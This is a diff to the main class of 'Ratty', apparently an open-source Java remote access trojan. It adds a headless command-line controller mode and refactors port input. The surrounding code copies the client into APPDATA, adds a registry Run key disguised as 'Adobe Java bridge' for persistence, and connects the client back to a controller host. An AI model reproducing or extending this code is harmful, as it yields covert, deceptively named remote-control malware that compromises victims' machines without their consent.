@@ -13,15 +13,20 @@ import javax.swing.UIManager;
 import javax.swing.plaf.nimbus.NimbusLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
+import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
-import de.sogomn.rat.server.gui.RattyGui;
+import de.sogomn.rat.server.cmd.RattyCmdController;
 import de.sogomn.rat.server.gui.RattyGuiController;
 
-
+/*
+ * This class is kinda hardcoded.
+ * I don't care.
+ * Sue me.
+ */
 public final class Ratty {
 	
 	public static final boolean DEBUG = true;
-	public static final String VERSION = "1.2";
+	public static final String VERSION = "1.3";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
 	private static String address;
@@ -35,8 +40,10 @@ public final class Ratty {
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
 	private static final String STARTUP_COMMAND = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java.exe";
 	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_COMMAND + " " + STARTUP_FILE_PATH + "\"";
+	private static final String NO_GUI_COMMAND = "NOGUI";
 	
-	private static final String PORT_INPUT_MESSAGE = LANGUAGE.getString("server.port_message");
+	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
+	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
 	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
 	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
 	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
@@ -83,9 +90,7 @@ public final class Ratty {
 		}
 	}
 	
-	private static int getPortInput() {
-		final String input = JOptionPane.showInputDialog(PORT_INPUT_MESSAGE);
-		
+	private static int parsePort(final String input) {
 		try {
 			final int port = Integer.parseInt(input);
 			
@@ -97,6 +102,12 @@ public final class Ratty {
 		} catch (final NumberFormatException | NullPointerException ex) {
 			return -1;
 		}
+	}
+	
+	private static int getPortInput() {
+		final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
+		
+		return parsePort(input);
 	}
 	
 	public static void connectToHost(final String address, final int port) {
@@ -120,10 +131,15 @@ public final class Ratty {
 		newClient.start();
 	}
 	
-	public static void startServer(final int port) {
+	public static void startServer(final int port, final boolean gui) {
 		final ActiveServer server = new ActiveServer(port);
-		final RattyGui gui = new RattyGui();
-		final RattyGuiController controller = new RattyGuiController(gui);
+		final AbstractRattyController controller;
+		
+		if (gui) {
+			controller = new RattyGuiController();
+		} else {
+			controller = new RattyCmdController();
+		}
 		
 		server.setObserver(controller);
 		server.start();
@@ -140,7 +156,7 @@ public final class Ratty {
 			if (input == JOptionPane.YES_OPTION) {
 				System.out.println(DEBUG_SERVER);
 				
-				startServer(port);
+				startServer(port, true);
 			} else if (input == JOptionPane.NO_OPTION) {
 				System.out.println(DEBUG_CLIENT);
 				
@@ -150,10 +166,22 @@ public final class Ratty {
 			addToStartup();
 			connectToHost(address, port);
 		} else {
-			final int port = getPortInput();
-			
-			if (port != -1) {
-				startServer(port);
+			if (args.length >= 2 && args[0].equalsIgnoreCase(NO_GUI_COMMAND)) {
+				final int port = parsePort(args[1]);
+				
+				if (port != -1) {
+					startServer(port, false);
+				} else {
+					System.out.println(PORT_ERROR_MESSAGE);
+				}
+			} else {
+				final int port = getPortInput();
+				
+				if (port != -1) {
+					startServer(port, true);
+				} else {
+					JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE);
+				}
 			}
 		}
 	}
